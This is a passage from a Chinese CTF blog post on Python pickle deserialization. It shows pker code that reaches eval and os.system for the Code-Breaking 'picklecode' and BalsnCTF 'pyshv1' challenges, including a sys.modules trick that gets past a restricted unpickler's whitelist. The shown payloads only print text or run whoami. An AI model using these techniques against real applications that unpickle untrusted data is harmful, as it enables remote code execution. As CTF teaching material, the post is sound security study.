<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">animal = INST(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;Animal&#x27;</span>)</span><br><span class="line">animal.name=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">animal.category=<span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="keyword">return</span> animal</span><br></pre></td></tr></table></figure>

<h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul>
<li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
<li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
</ul>
<h2 id="pker：CTF实战"><a href="#pker：CTF实战" class="headerlink" title="pker：CTF实战"></a>pker：CTF实战</h2><ul>
<li>在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。</li>
</ul>
<h3 id="Code-Breaking-picklecode-1"><a href="#Code-Breaking-picklecode-1" class="headerlink" title="Code-Breaking: picklecode"></a>Code-Breaking: picklecode</h3><p>解析思路见前文手写opcode的CTF实战部分，pker代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">dict_get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">glo_dic=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>)()</span><br><span class="line">builtins=dict_get(glo_dic,<span class="string">&#x27;builtins&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">getattr</span>(builtins,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;print(&quot;123&quot;)&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="BalsnCTF-pyshv1"><a href="#BalsnCTF-pyshv1" class="headerlink" title="BalsnCTF:pyshv1"></a>BalsnCTF:pyshv1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">whitelist = [<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br></pre></td></tr></table></figure>

<p>题目的<code>find_class</code>只允许<code>sys</code>模块，并且对象名中不能有<code>.</code>号。意图很明显，限制子模块，只允许一级模块。<br><code>sys</code>模块有一个字典对象<code>modules</code>，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。<code>modules</code>中还包括了<code>sys</code>本身。我们可以利用自己包含自己这点绕过限制，具体过程为：</p>
<ol>
<li>由于<code>sys</code>自身被包含在自身的子类里，我们可以利用这点使用<code>s</code>赋值，向后递进一级，引入<code>sys.modules</code>的子模块：<code>sys.modules[&#39;sys&#39;]=sys.modules</code>，此时就相当于<code>sys=sys.modules</code>。这样我们就可以利用原<code>sys.modules</code>下的对象了，即<code>sys.modules.xxx</code>。</li>
<li>首先获取<code>modules</code>的<code>get</code>函数，然后类似于上一步，再使用<code>s</code>把<code>modules</code>中的<code>sys</code>模块更新为<code>os</code>模块：<code>sys[&#39;sys&#39;]=sys.get(&#39;os&#39;)</code>。</li>
<li>使用<code>c</code>获取<code>system</code>，之后就可以执行系统命令了。</li>
</ol>
<p>整个利用过程还是很巧妙的，pker代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">modules=GLOBAL(<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;modules&#x27;</span>)</span><br><span class="line">modules[<span class="string">&#x27;sys&#x27;</span>]=modules</span><br><span class="line">modules_get=GLOBAL(<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">os=modules_get(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">modules[<span class="string">&#x27;sys&#x27;</span>]=os</span><br><span class="line">system=GLOBAL(<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmj7eex7uSxD5+Kx&alichlgref=https://xz.aliyun.com/t/7436#toc-17">更多案例</a></p>
</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-02-06</span><i class="fa fa-tag"></i><a class="tag" href="/tags/unSerialize/" title="unSerialize">unSerialize </a><span class="leancloud_visitors"></span><span>About 10289 words, 34 min 17 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%0Ahttps://zIxyd.github.io/2024/02/06/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/02/03/python%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" title="python原型污染">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>